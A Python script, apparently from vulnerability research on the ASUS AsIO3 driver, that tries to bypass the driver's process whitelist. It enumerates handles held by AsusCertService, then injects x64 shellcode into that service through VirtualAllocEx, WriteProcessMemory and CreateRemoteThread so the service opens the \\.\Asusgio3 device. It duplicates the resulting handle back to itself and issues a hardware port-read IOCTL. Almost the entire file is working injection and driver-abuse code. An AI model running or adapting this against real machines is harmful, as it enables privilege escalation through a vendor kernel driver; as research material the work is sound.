"""Simplified elevated handle enum + injection test. All paths absolute."""
import ctypes
import ctypes.wintypes as wintypes
from ctypes import byref, windll, c_size_t
import struct
import os
import sys
import json

REPORT_DIR = r"C:\Users\researcher\OneDrive\Desktop\report\AsIO3"
sys.stdout = open(os.path.join(REPORT_DIR, "elevated_output.txt"), "w")

ntdll = windll.ntdll
kernel32 = windll.kernel32
kernel32.OpenProcess.restype = wintypes.HANDLE
kernel32.CreateFileW.restype = wintypes.HANDLE
kernel32.GetCurrentProcess.restype = wintypes.HANDLE
kernel32.VirtualAllocEx.restype = ctypes.c_void_p
kernel32.GetProcAddress.restype = ctypes.c_void_p
kernel32.GetModuleHandleW.restype = wintypes.HANDLE
kernel32.CreateRemoteThread.restype = wintypes.HANDLE

PROCESS_ALL_ACCESS = 0x1F0FFF
PROCESS_DUP_HANDLE = 0x0040
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
DUPLICATE_SAME_ACCESS = 0x00000002
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
INFINITE = 0xFFFFFFFF

is_admin = ctypes.windll.shell32.IsUserAnAdmin()
print(f"Admin: {is_admin}")
print(f"PID: {os.getpid()}")

findings = {"admin": bool(is_admin)}

# Find AsusCertService PID
import subprocess
result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq AsusCertService.exe', '/FO', 'CSV'],
                       capture_output=True, text=True)
cert_pid = None
for line in result.stdout.strip().split('\n')[1:]:
    parts = line.strip('"').split('","')
    if len(parts) >= 2:
        cert_pid = int(parts[1])
        break

print(f"AsusCertService PID: {cert_pid}")
findings["cert_pid"] = cert_pid

# Test direct open
print("\n--- Direct Open Test ---")
h = kernel32.CreateFileW(r"\\.\Asusgio3", 0xC0000000, 3, None, 3, 0, None)
err = kernel32.GetLastError()
if h and h != 0xFFFFFFFFFFFFFFFF and h != -1:
    print(f"DIRECT OPEN SUCCESS: handle 0x{h:X}")
    findings["direct_open"] = True
    kernel32.CloseHandle(h)
else:
    print(f"Direct open failed: error {err}")
    findings["direct_open"] = False
    findings["direct_open_error"] = err

# Test OpenProcess on AsusCertService
if cert_pid:
    print(f"\n--- OpenProcess Test (PID {cert_pid}) ---")
    h_proc = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, cert_pid)
    if h_proc:
        print(f"OpenProcess SUCCESS: handle 0x{h_proc:X}")
        findings["can_open_certservice"] = True

        # Handle enumeration for this process
        print("\n--- Handle Enumeration ---")
        buf_size = 0x4000000
        buf = ctypes.create_string_buffer(buf_size)
        ret_len = ctypes.c_ulong(0)
        status = ntdll.NtQuerySystemInformation(64, buf, buf_size, byref(ret_len))
        if status >= 0:
            raw = buf.raw
            num_handles = struct.unpack_from('<Q', raw, 0)[0]
            print(f"Total handles: {num_handles}")
            entry_size = 0x28
            found_handles = []
            for i in range(min(num_handles, 1000000)):
                offset = 0x10 + i * entry_size
                if offset + entry_size > len(raw):
                    break
                pid = struct.unpack_from('<Q', raw, offset + 8)[0]
                if pid != cert_pid:
                    continue
                handle_val = struct.unpack_from('<Q', raw, offset + 0x10)[0]
                access = struct.unpack_from('<I', raw, offset + 0x18)[0]
                type_idx = struct.unpack_from('<H', raw, offset + 0x1E)[0]

                dup_h = wintypes.HANDLE(0)
                st = ntdll.NtDuplicateObject(
                    h_proc, handle_val,
                    kernel32.GetCurrentProcess(),
                    byref(dup_h), 0, 0, DUPLICATE_SAME_ACCESS)
                if st < 0:
                    continue

                name_buf = ctypes.create_string_buffer(2048)
                ret2 = ctypes.c_ulong(0)
                st2 = ntdll.NtQueryObject(dup_h, 1, name_buf, 2048, byref(ret2))
                obj_name = ""
                if st2 >= 0:
                    nlen = struct.unpack_from('<H', name_buf.raw, 0)[0]
                    if 0 < nlen < 1024:
                        try:
                            obj_name = name_buf.raw[8:8+nlen].decode('utf-16-le')
                        except:
                            pass
                kernel32.CloseHandle(dup_h)

                if 'asusgio' in obj_name.lower() or 'asio3' in obj_name.lower():
                    print(f"  DEVICE HANDLE FOUND: 0x{handle_val:X} access=0x{access:08X} name={obj_name}")
                    found_handles.append({"handle": handle_val, "access": access, "name": obj_name})

            findings["device_handles"] = found_handles
            if not found_handles:
                print("  No device handles found in AsusCertService")
        else:
            print(f"  NtQuerySystemInformation failed: 0x{status & 0xFFFFFFFF:08X}")

        # Attempt injection
        print("\n--- Injection Attempt ---")
        device_path = r"\\.\Asusgio3" + "\x00"
        path_bytes = device_path.encode('utf-16-le')

        # Allocate memory for path + result
        mem = kernel32.VirtualAllocEx(h_proc, None, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
        if mem:
            print(f"  Allocated memory at 0x{mem:X}")
            written = c_size_t(0)
            kernel32.WriteProcessMemory(h_proc, mem, path_bytes, len(path_bytes), byref(written))

            result_addr = mem + 0x200

            # Get CreateFileW address
            k32 = kernel32.GetModuleHandleW("kernel32.dll")
            cfw = kernel32.GetProcAddress(k32, b"CreateFileW")
            print(f"  CreateFileW at 0x{cfw:X}")

            # Shellcode
            sc = bytearray()
            sc += b'\x48\x83\xEC\x58'                          # sub rsp, 0x58
            sc += b'\x48\xB9' + struct.pack('<Q', mem)          # mov rcx, path_addr
            sc += b'\xBA' + struct.pack('<I', 0xC0000000)       # mov edx, GENERIC_RW
            sc += b'\x41\xB8' + struct.pack('<I', 3)            # mov r8d, SHARE_RW
            sc += b'\x4D\x31\xC9'                               # xor r9, r9
            sc += b'\xC7\x44\x24\x20' + struct.pack('<I', 3)   # [rsp+20h] = OPEN_EXISTING
            sc += b'\xC7\x44\x24\x28' + struct.pack('<I', 0)   # [rsp+28h] = 0
            sc += b'\x48\xC7\x44\x24\x30\x00\x00\x00\x00'     # [rsp+30h] = NULL
            sc += b'\x48\xB8' + struct.pack('<Q', cfw)          # mov rax, CreateFileW
            sc += b'\xFF\xD0'                                   # call rax
            sc += b'\x48\xA3' + struct.pack('<Q', result_addr)  # mov [result], rax
            sc += b'\x48\x83\xC4\x58'                          # add rsp, 0x58
            sc += b'\xC3'                                       # ret

            sc_mem = kernel32.VirtualAllocEx(h_proc, None, len(sc), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            if sc_mem:
                kernel32.WriteProcessMemory(h_proc, sc_mem, bytes(sc), len(sc), byref(written))
                print(f"  Shellcode at 0x{sc_mem:X} ({len(sc)} bytes)")

                # Zero result
                kernel32.WriteProcessMemory(h_proc, result_addr, b'\xFF'*8, 8, byref(written))

                # Create thread
                tid = wintypes.DWORD(0)
                ht = kernel32.CreateRemoteThread(h_proc, None, 0, sc_mem, None, 0, byref(tid))
                if ht:
                    print(f"  Thread created TID={tid.value}, waiting...")
                    kernel32.WaitForSingleObject(ht, 10000)

                    # Read result
                    rbuf = (ctypes.c_byte * 8)()
                    kernel32.ReadProcessMemory(h_proc, result_addr, rbuf, 8, byref(written))
                    remote_handle = struct.unpack('<Q', bytes(rbuf))[0]
                    print(f"  Remote CreateFileW returned: 0x{remote_handle:X}")

                    if remote_handle != 0 and remote_handle != 0xFFFFFFFFFFFFFFFF:
                        print(f"  DEVICE OPENED IN REMOTE PROCESS!")
                        findings["injection_open"] = True
                        findings["remote_handle"] = remote_handle

                        # Duplicate to us
                        our_h = wintypes.HANDLE(0)
                        st = ntdll.NtDuplicateObject(
                            h_proc, remote_handle,
                            kernel32.GetCurrentProcess(),
                            byref(our_h), 0, 0, DUPLICATE_SAME_ACCESS)
                        if st >= 0:
                            print(f"  Duplicated to our handle: 0x{our_h.value:X}")
                            # Test IOCTL
                            ibuf = (ctypes.c_byte * 8)()
                            ibuf[0] = 0x80
                            obuf = (ctypes.c_byte * 8)()
                            br = wintypes.DWORD(0)
                            r = kernel32.DeviceIoControl(our_h, 0xA0400F58, ibuf, 8, obuf, 8, byref(br), None)
                            if r:
                                print(f"  IOCTL SUCCESS! Port 0x80 = 0x{obuf[0]:02X}")
                                findings["ioctl_works"] = True
                                findings["port_80_value"] = obuf[0]
                            else:
                                ie = kernel32.GetLastError()
                                print(f"  IOCTL failed: error {ie}")
                                findings["ioctl_works"] = False
                                findings["ioctl_error"] = ie
                            kernel32.CloseHandle(our_h)
                        else:
                            print(f"  DuplicateObject failed: 0x{st & 0xFFFFFFFF:08X}")
                            findings["duplicate_failed"] = True
                    else:
                        print(f"  CreateFileW FAILED in remote process (returned INVALID_HANDLE)")
                        findings["injection_open"] = False
                        # The PID check in the driver will check AsusCertService's PID
                        # which SHOULD be in the whitelist. If it still fails,
                        # it means AsusCertService is not whitelisted either, or
                        # the Security Descriptor blocks it too.
                        print(f"  This means even AsusCertService's PID isn't in the whitelist,")
                        print(f"  OR the device SD blocks the service too.")

                    kernel32.CloseHandle(ht)
                else:
                    err = kernel32.GetLastError()
                    print(f"  CreateRemoteThread failed: error {err}")
                    findings["thread_failed"] = err
            else:
                print(f"  VirtualAllocEx for shellcode failed")
        else:
            print(f"  VirtualAllocEx failed")

        kernel32.CloseHandle(h_proc)
    else:
        err = kernel32.GetLastError()
        print(f"OpenProcess FAILED: error {err}")
        findings["can_open_certservice"] = False

# Save
with open(os.path.join(REPORT_DIR, "bypass_analysis.json"), 'w') as f:
    json.dump(findings, f, indent=2, default=str)
print(f"\nDone. Results saved.")
sys.stdout.close()
